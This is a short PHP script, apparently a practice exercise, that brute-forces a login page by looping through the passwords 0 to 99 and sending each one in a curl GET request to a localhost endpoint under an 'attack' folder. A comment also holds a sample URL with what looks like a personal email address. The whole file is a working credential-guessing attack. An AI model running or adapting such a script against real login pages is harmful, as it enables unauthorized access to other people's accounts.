<?php
$i;
for($i=0;$i<100;$i=$i+1)
{	#http://localhost:442/attack/loginSuc.php?email=abhijeetsingh@gmail.com&password=$i;
	$ch = curl_init("http://localhost:442/attack/loginSuc.php?email=attack&password=$i");
	curl_exec($ch);
	echo $ch;
	echo nl2br($i."\n");
}

?>